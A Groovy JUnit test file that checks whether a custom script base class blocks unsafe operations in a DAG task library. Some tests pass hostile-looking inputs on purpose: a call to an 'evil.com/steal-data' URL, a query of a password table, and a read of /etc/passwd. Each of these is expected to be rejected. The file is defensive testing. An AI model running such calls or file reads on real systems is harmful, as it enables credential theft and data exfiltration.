package org.softwood.dag.task

import org.junit.jupiter.api.Test
import org.junit.jupiter.api.BeforeEach
import org.softwood.dag.task.examples.EnterpriseScriptBase
import org.awaitility.Awaitility
import java.util.concurrent.TimeUnit

import static org.junit.jupiter.api.Assertions.*

/**
 * Tests for ScriptTask custom script base class functionality.
 *
 * Demonstrates how library consumers can provide their own
 * security models through custom script base classes.
 *
 * NOTE: Custom script base classes have limitations. They can:
 * - Intercept method calls on the script instance
 * - Provide safe API wrappers
 * - Validate input parameters
 *
 * They CANNOT block:
 * - Static GDK extension methods (like String.execute())
 * - Direct Java class access (like System, Runtime)
 * - JVM-level operations
 *
 * For true sandboxing, use a SecurityManager (deprecated) or run in isolated process.
 * See SECURITY_AUDIT_REPORT.md for full security analysis.
 */
class ScriptTaskCustomBaseTest {

    private TaskContext ctx

    @BeforeEach
    void setup() {
        ctx = new TaskContext()
    }

    private static <T> T awaitPromise(org.softwood.promise.Promise<T> p) {
        Awaitility.await()
                .atMost(5, TimeUnit.SECONDS)
                .until({ p.isDone() })
        return p.get()
    }

    @Test
    void testDefaultSecureScriptBase() {
        def task = new ScriptTask("test-secure", "Test Secure", ctx)

        task.with {
            sandboxed true  // Default
            script '''
                def result = [1, 2, 3].sum()
                return result
            '''
        }

        def prevPromise = ctx.promiseFactory.createPromise(null)
        def promise = task.execute(prevPromise)
        def result = awaitPromise(promise)
        
        assertEquals(6, result)
    }

    @Test
    void testCustomScriptBaseClass() {
        def task = new ScriptTask("test-custom", "Test Custom", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Use enterprise-approved operations
                writeAuditLog("Starting processing")
                def data = queryDatabase("SELECT * FROM financial_data.accounts")
                writeAuditLog("Processing completed")
                return data.size()
            '''
        }

        def prevPromise = ctx.promiseFactory.createPromise(null)
        def promise = task.execute(prevPromise)
        def result = awaitPromise(promise)
        
        assertEquals(2, result)  // Mock data returns 2 rows
    }

    @Test
    void testCustomScriptBaseBlocksUnapprovedDatabaseSchema() {
        def task = new ScriptTask("test-schema", "Test Schema", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Try to query unapproved schema
                queryDatabase("SELECT * FROM system_secrets.passwords")
            '''
        }

        def exception = assertThrows(Exception) {
            def prevPromise = ctx.promiseFactory.createPromise(null)
            def promise = task.execute(prevPromise)
            awaitPromise(promise)
        }

        assertTrue(
            exception.message?.contains("not approved") ||
            exception.cause?.message?.contains("not approved"),
            "Should throw SecurityException for unapproved schema"
        )
    }

    @Test
    void testCustomScriptBaseBlocksExternalApiCalls() {
        def task = new ScriptTask("test-external", "Test External", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Try to call external API
                callInternalApi("https://evil.com/steal-data")
            '''
        }

        def exception = assertThrows(Exception) {
            def prevPromise = ctx.promiseFactory.createPromise(null)
            def promise = task.execute(prevPromise)
            awaitPromise(promise)
        }

        assertTrue(
            exception.message?.contains("not allowed") ||
            exception.cause?.message?.contains("not allowed"),
            "Should throw SecurityException for external API call"
        )
    }

    @Test
    void testCustomScriptBaseAllowsApprovedOperations() {
        def task = new ScriptTask("test-approved", "Test Approved", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // All approved operations
                writeAuditLog("Starting")
                def dbData = queryDatabase("SELECT * FROM financial_data.accounts")
                def apiData = callInternalApi("https://api.example.com/endpoint")
                writeAuditLog("Completed")

                return [
                    dbRecords: dbData.size(),
                    apiStatus: apiData.status
                ]
            '''
        }

        def prevPromise = ctx.promiseFactory.createPromise(null)
        def promise = task.execute(prevPromise)
        def result = awaitPromise(promise)
        
        assertEquals(2, result.dbRecords)
        assertEquals(200, result.apiStatus)
    }

    @Test
    void testCustomScriptBaseClassValidation() {
        def task = new ScriptTask("test-invalid", "Test Invalid", ctx)

        // Try to set invalid script base class
        assertThrows(IllegalArgumentException) {
            task.customScriptBaseClass(String.class)  // Not a Script subclass
        }
    }

    @Test
    void testCustomScriptBaseEnablesSandboxing() {
        def task = new ScriptTask("test-auto-sandbox", "Test Auto Sandbox", ctx)

        task.with {
            sandboxed false  // Initially disabled
            customScriptBaseClass EnterpriseScriptBase  // This should enable it
        }

        // Verify sandboxing was automatically enabled
        assertTrue(task.sandboxed, "Setting customScriptBaseClass should enable sandboxing")
    }

    @Test
    void testNullCustomScriptBaseClassThrowsException() {
        def task = new ScriptTask("test-null", "Test Null", ctx)

        assertThrows(IllegalArgumentException) {
            task.customScriptBaseClass(null)
        }
    }

    @Test
    void testCustomScriptBaseValidatesUnapprovedFilePaths() {
        def task = new ScriptTask("test-file-path", "Test File Path", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Try to access unapproved file path
                readCompanyFile("/etc/passwd")
            '''
        }

        def exception = assertThrows(Exception) {
            def prevPromise = ctx.promiseFactory.createPromise(null)
            def promise = task.execute(prevPromise)
            awaitPromise(promise)
        }

        assertTrue(
            exception.message?.contains("denied") ||
            exception.cause?.message?.contains("denied"),
            "Should throw SecurityException for unapproved file path"
        )
    }

    @Test
    void testCustomScriptBaseAllowsAuditLogging() {
        def task = new ScriptTask("test-audit", "Test Audit", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Audit logging should always be allowed
                writeAuditLog("Test audit entry 1")
                writeAuditLog("Test audit entry 2")
                return "success"
            '''
        }

        def prevPromise = ctx.promiseFactory.createPromise(null)
        def promise = task.execute(prevPromise)
        def result = awaitPromise(promise)
        
        assertEquals("success", result)
    }
}
